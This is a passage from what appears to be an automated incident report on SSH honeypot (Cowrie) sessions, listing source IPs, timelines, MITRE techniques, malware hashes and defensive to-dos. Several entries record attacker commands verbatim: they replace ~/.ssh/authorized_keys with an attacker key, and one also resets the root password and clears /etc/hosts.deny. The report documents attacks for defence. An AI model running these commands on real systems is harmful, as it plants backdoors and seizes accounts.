- [ ] Block `154.18.197[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-367963b23b20

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 08:39 |
| **Last Seen** | 2026-06-05 08:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 08:39:41` | `cowrie.session.connect` |
| `2026-06-05 08:39:41` | `cowrie.client.version` |
| `2026-06-05 08:39:41` | `cowrie.client.kex` |
| `2026-06-05 08:39:42` | `cowrie.login.success` |
| `2026-06-05 08:39:43` | `cowrie.session.params` |
| `2026-06-05 08:39:43` | `cowrie.command.input` |
| `2026-06-05 08:39:43` | `cowrie.command.failed` |
| `2026-06-05 08:39:43` | `cowrie.log.closed` |
| `2026-06-05 08:39:43` | `cowrie.session.params` |
| `2026-06-05 08:39:43` | `cowrie.command.input` |
| `2026-06-05 08:39:44` | `cowrie.session.file_download` |
| `2026-06-05 08:39:44` | `cowrie.log.closed` |
| `2026-06-05 08:39:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f13f042b3039

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 08:39 |
| **Last Seen** | 2026-06-05 08:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 08:39:46` | `cowrie.session.connect` |
| `2026-06-05 08:39:46` | `cowrie.client.version` |
| `2026-06-05 08:39:47` | `cowrie.client.kex` |
| `2026-06-05 08:39:47` | `cowrie.login.success` |
| `2026-06-05 08:39:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1a958c18149

| Field | Detail |
|---|---|
| **Source IP** | `49.64.242[.]249` |
| **First Seen** | 2026-06-05 08:41 |
| **Last Seen** | 2026-06-05 08:41 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:4qdBHLJet8ex"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 08:41:02` | `cowrie.session.connect` |
| `2026-06-05 08:41:02` | `cowrie.client.version` |
| `2026-06-05 08:41:02` | `cowrie.client.kex` |
| `2026-06-05 08:41:04` | `cowrie.login.success` |
| `2026-06-05 08:41:06` | `cowrie.session.params` |
| `2026-06-05 08:41:06` | `cowrie.command.input` |
| `2026-06-05 08:41:06` | `cowrie.command.failed` |
| `2026-06-05 08:41:06` | `cowrie.log.closed` |
| `2026-06-05 08:41:09` | `cowrie.session.params` |
| `2026-06-05 08:41:09` | `cowrie.command.input` |
| `2026-06-05 08:41:09` | `cowrie.session.file_download` |
| `2026-06-05 08:41:09` | `cowrie.log.closed` |
| `2026-06-05 08:41:22` | `cowrie.session.params` |
| `2026-06-05 08:41:22` | `cowrie.command.input` |
| `2026-06-05 08:41:22` | `cowrie.log.closed` |
| `2026-06-05 08:41:23` | `cowrie.session.params` |
| `2026-06-05 08:41:23` | `cowrie.command.input` |
| `2026-06-05 08:41:23` | `cowrie.log.closed` |
| `2026-06-05 08:41:23` | `cowrie.session.params` |
| `2026-06-05 08:41:23` | `cowrie.command.input` |
| `2026-06-05 08:41:24` | `cowrie.session.file_download` |
| `2026-06-05 08:41:24` | `cowrie.log.closed` |
| `2026-06-05 08:41:24` | `cowrie.session.params` |
| `2026-06-05 08:41:24` | `cowrie.command.input` |
| `2026-06-05 08:41:25` | `cowrie.log.closed` |
| `2026-06-05 08:41:25` | `cowrie.session.params` |
| `2026-06-05 08:41:25` | `cowrie.command.input` |
| `2026-06-05 08:41:26` | `cowrie.log.closed` |
| `2026-06-05 08:41:27` | `cowrie.session.params` |
| `2026-06-05 08:41:27` | `cowrie.command.input` |
| `2026-06-05 08:41:27` | `cowrie.command.input` |
| `2026-06-05 08:41:27` | `cowrie.log.closed` |
| `2026-06-05 08:41:30` | `cowrie.session.params` |
| `2026-06-05 08:41:30` | `cowrie.command.input` |
| `2026-06-05 08:41:30` | `cowrie.log.closed` |
| `2026-06-05 08:41:31` | `cowrie.session.params` |
| `2026-06-05 08:41:31` | `cowrie.command.input` |
| `2026-06-05 08:41:31` | `cowrie.log.closed` |
| `2026-06-05 08:41:32` | `cowrie.session.params` |
| `2026-06-05 08:41:32` | `cowrie.command.input` |
| `2026-06-05 08:41:32` | `cowrie.log.closed` |
| `2026-06-05 08:41:33` | `cowrie.session.params` |
| `2026-06-05 08:41:33` | `cowrie.command.input` |
| `2026-06-05 08:41:33` | `cowrie.log.closed` |
| `2026-06-05 08:41:34` | `cowrie.session.params` |
| `2026-06-05 08:41:34` | `cowrie.command.input` |
| `2026-06-05 08:41:34` | `cowrie.log.closed` |
| `2026-06-05 08:41:34` | `cowrie.session.params` |
| `2026-06-05 08:41:34` | `cowrie.command.input` |
| `2026-06-05 08:41:35` | `cowrie.log.closed` |
| `2026-06-05 08:41:36` | `cowrie.session.params` |
| `2026-06-05 08:41:36` | `cowrie.command.input` |
| `2026-06-05 08:41:36` | `cowrie.log.closed` |
| `2026-06-05 08:41:37` | `cowrie.session.params` |
| `2026-06-05 08:41:37` | `cowrie.command.input` |
| `2026-06-05 08:41:38` | `cowrie.log.closed` |
| `2026-06-05 08:41:40` | `cowrie.session.params` |
| `2026-06-05 08:41:40` | `cowrie.command.input` |
| `2026-06-05 08:41:41` | `cowrie.log.closed` |
| `2026-06-05 08:41:42` | `cowrie.session.params` |
| `2026-06-05 08:41:42` | `cowrie.command.input` |
| `2026-06-05 08:41:43` | `cowrie.log.closed` |
| `2026-06-05 08:41:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.242[.]249` to AbuseIPDB if not already reported
- [ ] Block `49.64.242[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abb17d42d7ae

| Field | Detail |
|---|---|
| **Source IP** | `49.64.242[.]249` |
| **First Seen** | 2026-06-05 08:42 |
| **Last Seen** | 2026-06-05 08:42 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 08:42:05` | `cowrie.session.connect` |
| `2026-06-05 08:42:05` | `cowrie.client.version` |
| `2026-06-05 08:42:06` | `cowrie.client.kex` |
| `2026-06-05 08:42:08` | `cowrie.login.success` |
| `2026-06-05 08:42:11` | `cowrie.session.params` |
| `2026-06-05 08:42:11` | `cowrie.command.input` |
| `2026-06-05 08:42:11` | `cowrie.command.failed` |
| `2026-06-05 08:42:11` | `cowrie.log.closed` |
| `2026-06-05 08:42:13` | `cowrie.session.params` |
| `2026-06-05 08:42:13` | `cowrie.command.input` |
| `2026-06-05 08:42:13` | `cowrie.session.file_download` |
| `2026-06-05 08:42:13` | `cowrie.log.closed` |
| `2026-06-05 08:42:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.242[.]249` to AbuseIPDB if not already reported
- [ ] Block `49.64.242[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c9e4a1bd79d

| Field | Detail |
|---|---|
| **Source IP** | `49.64.242[.]249` |
| **First Seen** | 2026-06-05 08:42 |
| **Last Seen** | 2026-06-05 08:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 08:42:21` | `cowrie.session.connect` |
| `2026-06-05 08:42:21` | `cowrie.client.version` |
| `2026-06-05 08:42:21` | `cowrie.client.kex` |
| `2026-06-05 08:42:23` | `cowrie.login.success` |
| `2026-06-05 08:42:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.242[.]249` to AbuseIPDB if not already reported
- [ ] Block `49.64.242[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21a5ac8cab92

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 08:45 |
| **Last Seen** | 2026-06-05 08:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 08:45:21` | `cowrie.session.connect` |
| `2026-06-05 08:45:21` | `cowrie.client.version` |
| `2026-06-05 08:45:21` | `cowrie.client.kex` |
| `2026-06-05 08:45:22` | `cowrie.login.success` |
| `2026-06-05 08:45:23` | `cowrie.session.params` |
| `2026-06-05 08:45:23` | `cowrie.command.input` |
| `2026-06-05 08:45:23` | `cowrie.command.failed` |
| `2026-06-05 08:45:23` | `cowrie.log.closed` |
| `2026-06-05 08:45:24` | `cowrie.session.params` |
| `2026-06-05 08:45:24` | `cowrie.command.input` |
| `2026-06-05 08:45:24` | `cowrie.session.file_download` |
| `2026-06-05 08:45:24` | `cowrie.log.closed` |
| `2026-06-05 08:45:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48b177bed593

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 08:45 |
| **Last Seen** | 2026-06-05 08:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 08:45:27` | `cowrie.session.connect` |
| `2026-06-05 08:45:27` | `cowrie.client.version` |
| `2026-06-05 08:45:27` | `cowrie.client.kex` |
| `2026-06-05 08:45:28` | `cowrie.login.success` |
| `2026-06-05 08:45:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d996d62816c

| Field | Detail |
|---|---|
| **Source IP** | `223.197.186[.]7` |
| **First Seen** | 2026-06-05 08:47 |
| **Last Seen** | 2026-06-05 08:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 08:47:18` | `cowrie.session.connect` |
| `2026-06-05 08:47:18` | `cowrie.client.version` |
| `2026-06-05 08:47:18` | `cowrie.client.kex` |
| `2026-06-05 08:47:19` | `cowrie.login.success` |
| `2026-06-05 08:47:19` | `cowrie.session.params` |
| `2026-06-05 08:47:19` | `cowrie.command.input` |
| `2026-06-05 08:47:19` | `cowrie.command.failed` |
| `2026-06-05 08:47:19` | `cowrie.log.closed` |
| `2026-06-05 08:47:20` | `cowrie.session.params` |
| `2026-06-05 08:47:20` | `cowrie.command.input` |
| `2026-06-05 08:47:20` | `cowrie.session.file_download` |
| `2026-06-05 08:47:20` | `cowrie.log.closed` |
| `2026-06-05 08:47:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.186[.]7` to AbuseIPDB if not already reported
- [ ] Block `223.197.186[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f12a4fb3b50e

| Field | Detail |
|---|---|
| **Source IP** | `223.197.186[.]7` |
| **First Seen** | 2026-06-05 08:47 |
| **Last Seen** | 2026-06-05 08:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 08:47:22` | `cowrie.session.connect` |
| `2026-06-05 08:47:22` | `cowrie.client.version` |
| `2026-06-05 08:47:22` | `cowrie.client.kex` |
| `2026-06-05 08:47:23` | `cowrie.login.success` |
| `2026-06-05 08:47:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.186[.]7` to AbuseIPDB if not already reported
- [ ] Block `223.197.186[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3297690cde9d

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 08:50 |
| **Last Seen** | 2026-06-05 08:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 08:50:46` | `cowrie.session.connect` |
| `2026-06-05 08:50:46` | `cowrie.client.version` |
| `2026-06-05 08:50:46` | `cowrie.client.kex` |
| `2026-06-05 08:50:47` | `cowrie.login.success` |
| `2026-06-05 08:50:47` | `cowrie.session.params` |
| `2026-06-05 08:50:47` | `cowrie.command.input` |
| `2026-06-05 08:50:47` | `cowrie.command.failed` |
| `2026-06-05 08:50:48` | `cowrie.log.closed` |
| `2026-06-05 08:50:48` | `cowrie.session.params` |
| `2026-06-05 08:50:48` | `cowrie.command.input` |
| `2026-06-05 08:50:48` | `cowrie.session.file_download` |
| `2026-06-05 08:50:48` | `cowrie.log.closed` |
| `2026-06-05 08:50:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb58a678ee69

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 08:50 |
| **Last Seen** | 2026-06-05 08:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 08:50:51` | `cowrie.session.connect` |
| `2026-06-05 08:50:51` | `cowrie.client.version` |
| `2026-06-05 08:50:51` | `cowrie.client.kex` |
| `2026-06-05 08:50:52` | `cowrie.login.success` |
| `2026-06-05 08:50:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4cfde6150df

| Field | Detail |
|---|---|
| **Source IP** | `223.197.186[.]7` |
| **First Seen** | 2026-06-05 08:51 |
| **Last Seen** | 2026-06-05 08:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 08:51:49` | `cowrie.session.connect` |
| `2026-06-05 08:51:49` | `cowrie.client.version` |
| `2026-06-05 08:51:49` | `cowrie.client.kex` |
| `2026-06-05 08:51:50` | `cowrie.login.success` |
| `2026-06-05 08:51:50` | `cowrie.session.params` |
| `2026-06-05 08:51:50` | `cowrie.command.input` |
| `2026-06-05 08:51:50` | `cowrie.command.failed` |
| `2026-06-05 08:51:50` | `cowrie.log.closed` |
| `2026-06-05 08:51:50` | `cowrie.session.params` |
| `2026-06-05 08:51:50` | `cowrie.command.input` |
| `2026-06-05 08:51:51` | `cowrie.session.file_download` |
| `2026-06-05 08:51:51` | `cowrie.log.closed` |
| `2026-06-05 08:51:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.186[.]7` to AbuseIPDB if not already reported
- [ ] Block `223.197.186[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7155a7ec8f8e

| Field | Detail |
|---|---|
| **Source IP** | `223.197.186[.]7` |
| **First Seen** | 2026-06-05 08:51 |
| **Last Seen** | 2026-06-05 08:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 08:51:53` | `cowrie.session.connect` |
| `2026-06-05 08:51:53` | `cowrie.client.version` |
| `2026-06-05 08:51:53` | `cowrie.client.kex` |
| `2026-06-05 08:51:54` | `cowrie.login.success` |
| `2026-06-05 08:51:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.186[.]7` to AbuseIPDB if not already reported
- [ ] Block `223.197.186[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-272fd0581b96

| Field | Detail |
|---|---|
| **Source IP** | `35.208.7[.]216` |
| **First Seen** | 2026-06-05 08:52 |
| **Last Seen** | 2026-06-05 08:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 08:52:32` | `cowrie.session.connect` |
| `2026-06-05 08:52:32` | `cowrie.client.version` |
| `2026-06-05 08:52:32` | `cowrie.client.kex` |
| `2026-06-05 08:52:33` | `cowrie.login.success` |
| `2026-06-05 08:52:33` | `cowrie.session.params` |
| `2026-06-05 08:52:33` | `cowrie.command.input` |
| `2026-06-05 08:52:33` | `cowrie.command.failed` |
| `2026-06-05 08:52:34` | `cowrie.log.closed` |
| `2026-06-05 08:52:34` | `cowrie.session.params` |
| `2026-06-05 08:52:34` | `cowrie.command.input` |
| `2026-06-05 08:52:34` | `cowrie.session.file_download` |
| `2026-06-05 08:52:34` | `cowrie.log.closed` |
| `2026-06-05 08:52:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.208.7[.]216` to AbuseIPDB if not already reported
- [ ] Block `35.208.7[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9752160302e6
